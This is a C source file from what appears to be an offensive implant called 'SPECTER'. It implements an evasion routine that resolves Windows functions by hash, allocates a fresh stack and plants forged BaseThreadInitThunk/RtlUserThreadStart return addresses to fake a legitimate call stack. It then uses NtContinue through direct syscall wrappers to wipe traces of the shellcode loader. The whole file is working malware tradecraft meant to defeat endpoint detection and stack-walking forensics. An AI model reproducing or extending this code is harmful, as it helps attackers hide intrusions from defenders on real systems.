/**
 * SPECTER Implant — NtContinue Entry Transfer
 *
 * Transfers execution to a target function using NtContinue with a
 * synthetic CONTEXT64 and clean thread context.  This provides:
 *   1. A fresh stack with no traces of the initial shellcode loader
 *   2. Synthetic stack frames mimicking BaseThreadInitThunk →
 *      RtlUserThreadStart for legitimate-looking call stacks
 *   3. Clean register state with no residual data from the loader
 *
 * NtContinue is a syscall that replaces the current thread context
 * with the supplied CONTEXT64 — it does not return to the caller.
 * The kernel restores all registers including RIP and RSP, effectively
 * teleporting execution to the target function.
 */

#include "specter.h"
#include "ntdefs.h"
#include "sleep.h"
#include "syscalls.h"
#include "evasion.h"
#include "peb.h"

/* Stack allocation size for the synthetic stack (64 KB) */
#define NTCONTINUE_STACK_SIZE   0x10000

/* ------------------------------------------------------------------ */
/*  Helper: resolve frame termination functions                        */
/* ------------------------------------------------------------------ */

static PVOID resolve_basethreadinitthunk(void) {
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32)
        return NULL;
    return find_export_by_hash(k32, HASH_BASETHREADINITTHUNK);
}

static PVOID resolve_rtluserthreadstart(void) {
    PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll)
        return NULL;
    return find_export_by_hash(ntdll, HASH_RTLUSERTHREADSTART);
}

/* ------------------------------------------------------------------ */
/*  evasion_ntcontinue_transfer                                         */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_ntcontinue_transfer(EVASION_CONTEXT *ctx,
                                      PVOID target_func, PVOID param) {
    if (!ctx || !target_func)
        return STATUS_INVALID_PARAMETER;

    NTSTATUS status;

    /* ---- Step 1: Allocate a fresh stack ---- */
    PVOID  stack_base = NULL;
    SIZE_T stack_size = NTCONTINUE_STACK_SIZE;
    HANDLE current_process = (HANDLE)(ULONG_PTR)-1;

    status = spec_NtAllocateVirtualMemory(
        current_process,
        &stack_base,
        0,
        &stack_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status))
        return status;

    /* ---- Step 2: Resolve frame termination addresses ---- */
    PVOID basethreadinitthunk = resolve_basethreadinitthunk();
    PVOID rtluserthreadstart  = resolve_rtluserthreadstart();

    /* ---- Step 3: Build synthetic stack frames ---- */
    /* Stack grows downward.  We place the RSP near the top of the
       allocated region, leaving room for the synthetic frames.
       Layout (high → low):
         [top of allocation + stack_size]
         ... guard space ...
         [RtlUserThreadStart return addr]   <- bottom frame
         [BaseThreadInitThunk return addr]  <- mid frame
         [shadow space: 32 bytes]           <- home area for target
         [RSP points here]                  <- CONTEXT64.Rsp
    */
    PBYTE stack_top = (PBYTE)stack_base + stack_size;

    /* Align to 16 bytes (required by x64 ABI) then subtract 8 for
       the "call" alignment (RSP must be 16-byte aligned BEFORE the
       return address push, i.e., RSP mod 16 == 8 at function entry) */
    QWORD *sp = (QWORD *)((ULONG_PTR)(stack_top - 256) & ~(ULONG_PTR)0xF);

    /* Place synthetic return addresses on the stack.
       These create a plausible call chain when the stack is walked. */

    /* Frame 0 (deepest): RtlUserThreadStart "called"
       BaseThreadInitThunk which "called" our target */
    if (rtluserthreadstart) {
        /* Return address for BaseThreadInitThunk → points into
           RtlUserThreadStart (offset +0x21 is typical for the call
           to BaseThreadInitThunk, but exact offset varies; we use
           the function start as a close approximation) */
        sp[5] = (QWORD)(ULONG_PTR)rtluserthreadstart;
    }

    if (basethreadinitthunk) {
        /* Return address for target → points into
           BaseThreadInitThunk (similarly approximated) */
        sp[4] = (QWORD)(ULONG_PTR)basethreadinitthunk;
    }

    /* Shadow space (4 x 8 bytes = 32 bytes) for the target function's
       home area, as required by the x64 calling convention */
    sp[0] = 0;  /* RCX home */
    sp[1] = 0;  /* RDX home */
    sp[2] = 0;  /* R8 home  */
    sp[3] = 0;  /* R9 home  */

    /* ---- Step 4: Build CONTEXT64 structure ---- */
    CONTEXT64 thread_ctx;
    spec_memset(&thread_ctx, 0, sizeof(CONTEXT64));

    thread_ctx.ContextFlags = CONTEXT_FULL;

    /* Set instruction pointer to the target function */
    thread_ctx.Rip = (QWORD)(ULONG_PTR)target_func;

    /* Set stack pointer to our synthetic stack.
       Point past shadow space so target sees proper home area. */
    thread_ctx.Rsp = (QWORD)(ULONG_PTR)sp;

    /* Set RCX = param (first argument in x64 calling convention) */
    thread_ctx.Rcx = (QWORD)(ULONG_PTR)param;

    /* Set segment registers to standard user-mode values */
    thread_ctx.SegCs = 0x33;  /* x64 user-mode code segment */
    thread_ctx.SegDs = 0x2B;
    thread_ctx.SegEs = 0x2B;
    thread_ctx.SegFs = 0x53;
    thread_ctx.SegGs = 0x2B;
    thread_ctx.SegSs = 0x2B;

    /* EFLAGS: interrupts enabled, direction flag clear */
    thread_ctx.EFlags = 0x202;

    /* MXCSR: default value (mask all FP exceptions) */
    thread_ctx.MxCsr = 0x1F80;

    /* ---- Step 5: Call NtContinue — does not return ---- */
    /* NtContinue replaces the current thread context with the
       supplied CONTEXT64 and resumes execution at Rip.  The
       current function's stack frame is abandoned. */
    status = spec_NtContinue(&thread_ctx, FALSE);

    /* If we get here, NtContinue failed — should not happen */
    return status;
}
